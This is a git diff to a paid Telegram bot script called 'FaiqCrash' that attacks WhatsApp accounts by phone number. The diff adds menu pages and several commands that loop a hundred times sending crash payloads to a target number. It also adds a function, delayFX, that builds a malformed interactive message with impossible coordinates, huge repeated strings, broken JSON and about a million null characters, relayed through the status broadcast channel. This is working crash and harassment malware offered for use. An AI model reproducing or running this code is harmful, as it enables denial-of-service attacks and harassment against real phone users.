@@ -1873,6 +1873,7 @@ bot.action('/bug', async (ctx) => {
 〢☐ /FaiqxRaraMedium [ Medium Delay ]
 〢☐ /FaiqxRaraHard [ Delay Hard ]
 〢☐ /FaiqxRaraExtreme [ Extreme Delay ]
+〢☐ /FaiqxRaraSuper [ Super Delay ]
 
 🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
 ────────────────
@@ -1907,6 +1908,71 @@ Page 3/4</blockquote>`;
                 url: "https://t.me/FaiqOffc"
             }, 
             {   text: ">",
+                callback_data: "/bug2"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(bugMenu, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
+            await ctx.answerCbQuery();
+        } else {
+        }
+    }
+});
+
+bot.action('/bug2', async (ctx) => {
+    const bugMenu = `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+🧬 - 𝐃𝐞𝐥𝐚𝐲 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
+──────────────
+〢☐ /FaiqxRaraInvisCombo [ Invisible Delay Combo Forclose ]
+〢☐ /FaiqxRaraMediumCombo [ Medium Delay Combo Forclose ]
+〢☐ /FaiqxRaraHardCombo [ Delay Hard Combo Forclose ]
+〢☐ /FaiqxRaraExtremeCombo [ Extreme Delay Combo Forclose ]
+〢☐ /FaiqxRaraSuperCombo [ Super Delay Combo Forclose ]
+
+🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
+────────────────
+〢☐ /FaiqxRaraForceCallCombo [ Forclose Spam Call Combo Delay ]
+〢☐ /FaiqxRaraForceCombo [ Forcloce Delete Messenge Combo Delay ]
+〢☐ /FaiqxRaraForceInvisCombo [ Forcloce Spam Call Invis Combo Delay ]
+〢☐ /FaiqxRaraForceDelayCombo [ Forcloce Invisible Hard Combo Delay ]
+
+🧬 - 𝐂𝐫𝐚𝐬𝐡 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
+──────────────
+〢☐ /FaiqxRaraBlankCombo [ Blank Andro Combo Forclose ]
+〢☐ /FaiqxRaraBlankV2Combo [ Blank Andro Hard Combo Forclose ]
+〢☐ /FaiqxRaraCrashCombo [ Crash Andro Combo Forclose ]
+〢☐ /FaiqxRaraCrashInvisCombo [ Crash Andro Invisible Combo Forclose ]
+〢☐ /FaiqxRaraCrashInfinityCombo [ Crash Andro Invisible Infinity Combo Forclose ]
+
+🧬 - 𝐌𝐮𝐥𝐭𝐢 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
+──────────────
+〢☐ /multibug [ Bug Lebih Dari 1 Nomor ]
+
+Example: /FaiqxRaraInvisCombo 62xxxx 
+
+Page 4/5</blockquote>`;
+
+    const keyboard = [
+        [
+            {
+                text: "<",
+                callback_data: "/bug"
+            }, 
+            {   text: "Owner",
+                url: "https://t.me/FaiqOffc"
+            }, 
+            {   text: ">",
                 callback_data: "/fun"
             }
         ]
@@ -1926,6 +1992,7 @@ Page 3/4</blockquote>`;
         }
     }
 });
+
 bot.action('/about', async (ctx) => {
     const aboutMenu = `
 <blockquote>
@@ -1986,7 +2053,7 @@ bot.action('/tqto', async (ctx) => {
 
  Thank you for purchasing the FaiqCrash script
  
- Page 5/6</blockquote>`;
+ Page 6/7</blockquote>`;
 
     const keyboard = [
         [
@@ -2034,13 +2101,13 @@ bot.action('/fun', async (ctx) => {
 〢☐ /cekid - Check Id Website
 〢☐ /cekbio - Check Bio WhatsApp
 
-Page 4/5</blockquote>`;
+Page 5/6</blockquote>`;
 
     const keyboard = [
         [
             {
                 text: "<",
-                callback_data: "/bug"
+                callback_data: "/bug2"
             },
             {   text: "Owner",
                 url: "https://t.me/FaiqOffc"
@@ -2245,7 +2312,199 @@ bot.command("FaiqxRaraExtreme", checkWhatsAppConnection, checkPremium, checkCool
     }
   });
 });
-      
+
+bot.command("FaiqxRaraSuper", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraHard 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Extreme
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await delayFX(sock, target);
+   await delayFX(sock, target);
+   await delayFX(sock, target);
+   await delayFX(sock, target);
+   await delayFX(sock, target);
+   await delayFX(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Extreme
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("FaiqxRaraInvisCombo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraInvisCombo 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await KhasJawaDelayInvis(sock, target);
+   await KhasJawaDelayInvis(sock, target);
+   await KhasJawaForce(sock, target);
+   await KhasJawaForce(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("FaiqxRaraMediumCombo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraMediumCombo 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await KhasJawaDelayInvis(sock, target);
+   await KhasJawaDelayInvis(sock, target);
+   await delaayylangu(sock, target);
+   await delaayylangu(sock, target);
+   await KhasJawaForce(sock, target);
+   await KhasJawaForce(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
+bot.command("FaiqxRaraHardCombo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraHardCombo 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = false;
+
+  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
+    caption: `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Process</blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+    for (let i = 0; i < 100; i++) {
+   await KhasJawaDelayInvis(sock, target);
+   await KhasJawaDelayInvis(sock, target);
+   await invisibleSpam(sock, target);
+   await invisibleSpam(sock, target);
+   await delaayylangu(sock, target);
+   await delaayylangu(sock, target);
+   await KhasJawaForce(sock, target);
+   await KhasJawaForce(sock, target);
+   await sleep(1000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote>⬡═―—⊱ ⎧ F A I Q C R A S H ⎭ ⊰―—═⬡
+
+☐ Target: ${q}
+☐ Type: Delay Bebas Spam
+☐ Status: Success</blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+
 bot.command("FaiqxRaraForceCall", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraForceCall 62×××`);
@@ -3556,5 +3815,92 @@ async function CrashInvisLocaVnX(sock, target) {
   });
 }
 
+async function delayFX(sock, target) {
+  console.log(chalk.red(`SENDING BUG`));
+
+  const akhjx = proto.Message.fromObject({
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            locationMessage: {
+              degreesLatitude: -999.03499999999999,
+              degreesLongitude: 922.9999999999999,
+              name: "Fuck Kill" + "Faiq Crash".repeat(40000),
+              url: "https://t.me/FaiqOffc",
+              contextInfo: {
+                externalAdReply: {
+                  quotedAd: {
+                    advertiserName: "FUCKKKK".repeat(40000),
+                    mediaType: "IMAGE",
+                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
+                    caption: "οταϰ ιѕ нєяє"
+                  },
+                  placeholderKey: {
+                    remoteJid: "0@g.us",
+                    fromMe: true,
+                    id: "ABCDEF1234567890"
+                  }
+                }
+              }
+            },
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "HELLO"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "{[",
+            messageVersion: 3,
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: ""
+              },
+              {
+                name: "galaxy_message",
+                buttonParamsJson: JSON.stringify({
+                  icon: "RIVIEW",
+                  flow_cta: "ꦽ".repeat(10000),
+                  flow_message_version: "3"
+                })
+              },
+              {
+                name: "galaxy_message",
+                buttonParamsJson: JSON.stringify({
+                  icon: "RIVIEW",
+                  flow_cta: "ꦾ".repeat(10000),
+                  flow_message_version: "3"
+                })
+              }
+            ]
+          },
+          quotedMessage: {
+            interactiveResponseMessage: {
+              nativeFlowResponseMessage: {
+                version: 3,
+                name: "call_permission_request",
+                paramsJson: "\u0000".repeat(1045000)
+              },
+              body: {
+                text: "KILL YOU",
+                format: "DEFAULT"
+              }
+            }
+          }
+        }
+      }
+    }
+  });
+
+  const statusJid = "status@broadcast";
+  const msg = await generateWAMessageFromContent(statusJid, akhjx, { 
+    userJid: sock.user.id 
+  });
+  
+  await sock.relayMessage(statusJid, msg.message, { 
+    messageId: msg.key.id 
+  });
+}
 //============( END ) =======\\
 bot.launch()
